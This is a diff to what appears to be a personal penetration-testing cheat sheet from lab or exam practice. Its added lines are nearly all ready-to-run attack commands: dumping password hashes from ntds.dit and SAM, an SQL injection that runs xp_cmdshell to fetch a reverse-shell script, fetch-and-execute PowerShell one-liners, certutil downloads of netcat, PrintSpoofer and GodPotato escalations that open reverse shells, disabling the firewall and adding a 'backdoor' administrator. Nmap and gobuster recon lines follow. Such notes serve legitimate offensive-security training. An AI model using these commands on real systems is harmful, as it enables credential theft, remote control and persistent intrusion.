@@ -1,4 +1,42 @@
-================================================================================
+Dump Secrets Such as SYSTEM and ntds.dit:
+
+```bash
+impacket-secretsdump -ntds ntds.dit -system SYSTEM -sam SAM LOCAL
+```
+
+```bash
+admin' UNION SELECT 1,2; EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.163:8000/rev.ps1") | powershell -noprofile';--+
+
+iex(iwr -uri 192.168.45.163:8000/transfer_files.ps1 -usebasicparsing)
+
+iex(iwr -uri 192.168.49.129:8000/transfer_files.ps1 -usebasicparsing)
+
+iex(iwr -uri 10.10.112.153:1234/transfer_files_ad.ps1 -usebasicparsing)
+certutil.exe -f -urlcache -split http://192.168.49.129:8000/nc.exe nc.exe
+
+certutil.exe -f -urlcache -split http://192.168.45.163:8000/
+
+# Uploaded nc.exe from /usr/share/windows-resources/binaries/nc.exe
+.\PrintSpoofer64.exe -c ".\nc.exe -e cmd.exe 192.168.45.163 6969"
+
+.\PrintSpoofer64.exe -i -c C:\Windows\Tasks\binary.exe
+
+.\GodPotato-NET2.exe -cmd ".\nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.163 6969"
+
+Start-Process "$env:windir\system32\mstsc.exe" -ArgumentList "/v:dev04.medtech.com"
+
+# Create Another Admin for RDP
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
+netsh advfirewall set allprofiles state off
+net user /add backdoor Password123
+net localgroup administrators /add backdoor
+net localgroup "Remote Desktop Users" backdoor /add
+xfreerdp /v:192.168.152.153 /u:backdoor /p:Password123 /cert:ignore +clipboard
+
+curl http://192.168.45.163:8000/linpeas.sh -o linpeas.sh;chmod +x linpeas.sh;
+curl http://192.168.45.163:8000/pspy64 -o pspy64;chmod +x pspy64;./pspy64
+```
+
 ===Nmap====
 nmap -p- -sT -sV -A $IP
 nmap -p- -sC -sV $IP --open
@@ -27,10 +65,10 @@ SEE EVASION MODALITIES.
 dnsrecon –d yourdomain.com
 ================================================================================
 ===gobuster directory
-gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -k -t 30
+gobuster dir -u http://$ip/ -w /opt/SecLists/Discovery/Web-Content/combined_directories.txt -k -t 30
 
 ===gobuster files
-gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt -k -t 30
+gobuster dir -u http://$ip/ -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt -k -t 30 -x txt,pdf,config
 
 ===gobuster for SubDomain brute forcing:
 gobuster dns -d domain.org -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
